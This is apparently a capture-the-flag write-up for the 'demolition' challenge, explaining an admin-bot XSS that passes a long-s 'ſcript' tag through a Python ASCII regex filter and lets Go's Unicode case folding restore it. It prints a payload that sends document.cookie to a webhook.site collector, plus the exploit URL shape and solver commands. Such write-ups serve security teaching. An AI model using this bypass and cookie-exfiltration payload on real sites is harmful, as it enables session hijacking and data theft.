# demolition

`demolition` is a same-origin admin-bot XSS hidden behind a split Python/Go rendering stack. The UI looks like a harmless preview playground, but the engine choice is user-controlled through the `profile` blob, the page auto-runs the renderer on load, and the two sanitizers disagree on what counts as a `<script>` tag.

Final flag:

```text
CTF{7b5d3e42e57dab38821b5215138825098cbe965c67c131b6c64be1805626481d}
```

## Surface Triage

Three files matter:

- `app.py` exposes `/api/profile` and `/api/render`
- `static/client.js` pulls `p` and `d` from the query string and auto-renders them
- `go-sanitizer/main.go` is the alternate sanitizer used when the render engine is switched to `go`

The bot in `bot.js` is also important:

1. it opens the challenge origin
2. it sets a readable `FLAG` cookie for that origin
3. it visits the attacker-supplied URL

So this is not a cross-origin theft problem. We only need JavaScript execution on a page served from `https://demolition.breakable.live`.

## Step 1: Force The Go Render Path

The landing page stores query parameter `p` into `boot.profile`, then `client.js` immediately calls:

```javascript
getProfile(profileBlob)
```

The backend parses dotted assignments like:

```text
render.engine=go
```

into:

```json
{"render":{"engine":"go"}}
```

Then `forgeRuntime()` copies `render.engine` into the manifest used by `runRender()`. Because `runRender()` is executed automatically on page load, the URL parameter alone is enough to force:

```json
{"engine":"go"}
```

into `/api/render`.

So the first half of the exploit URL is simply:

```text
?p=render.engine=go
```

## Step 2: Bypass The Python Lexical Fence

Before the request reaches the Go sanitizer, `/api/render` applies a Python regex:

```python
SCRIPT_FENCE_RE = re.compile(r"<\s*/?\s*script\b", re.IGNORECASE | re.ASCII)
```

That `re.ASCII` flag is the weakness. It only recognizes ASCII letters for the word `script`.

So:

```text
<script>
```

is blocked, but:

```text
<ſcript>
```

is not. The first character there is U+017F, the Latin small letter long s.

Local proof:

```text
re.ASCII fence on "<script>"  -> match
re.ASCII fence on "<ſcript>" -> no match
```

## Step 3: Let Go Canonicalize It Back To `<script>`

Once we reach `go-sanitizer/main.go`, tag names are checked with:

```go
strings.EqualFold(name, candidate)
```

and the allowed list is:

```go
[]string{"script"}
```

Go's Unicode case folding treats:

```text
strings.EqualFold("ſcript", "script") == true
```

So the sanitizer decides the tag is an allowed `script` tag and rewrites it to the canonical ASCII form:

```html
<script>...</script>
```

This is the key mismatch:

- Python blocks only ASCII `script`
- Go accepts Unicode-equivalent `ſcript`

## Step 4: Make The Browser Execute It

`client.js` renders the server response with:

```javascript
els.rendered.innerHTML = data.html || "";
armScripts(els.rendered);
```

`innerHTML` inserts the sanitized markup, then `armScripts()` recreates every `<script>` node so inline JavaScript executes.

That means a payload like this runs in the victim bot's browser:

```html
<ſcript>
(() => {
  const c = encodeURIComponent(document.cookie);
  (new Image).src = "https://webhook.site/<uuid>?c=" + c;
})();
</ſcript>
```

Because the bot already set the `FLAG` cookie on the challenge origin, `document.cookie` contains the flag.

## Final Exploit URL

The exploit URL shape is:

```text
https://demolition.breakable.live/?p=render.engine=go&d=<payload>
```

where `<payload>` is the URL-encoded long-s script tag above.

In practice:

1. generate the exploit URL
2. submit it to the remote bot
3. wait for the webhook hit containing `FLAG=CTF{...}`

The captured remote flag was:

```text
CTF{7b5d3e42e57dab38821b5215138825098cbe965c67c131b6c64be1805626481d}
```

## Why The Bug Exists

This challenge is a clean example of why mixed-language sanitization is dangerous:

- the frontend treats the backend response as trusted HTML
- the Python pre-filter and the Go sanitizer do not share the same notion of case-insensitive tag matching
- the bot stores the secret in a readable cookie on the same origin

Any one of those choices would be survivable alone. Together they produce a one-click stored-like self-XSS against the bot session.

## Solver

[solve_demolition.py](./solve_demolition.py) generates the exploit URL and can try common bot submission endpoints for the remote deployment:

```bash
python3 solve_demolition.py --webhook https://webhook.site/<uuid>
python3 solve_demolition.py --webhook https://webhook.site/<uuid> --submit
```

The helper does not need the local source tree to work. It only needs a webhook collector and the remote challenge URL.
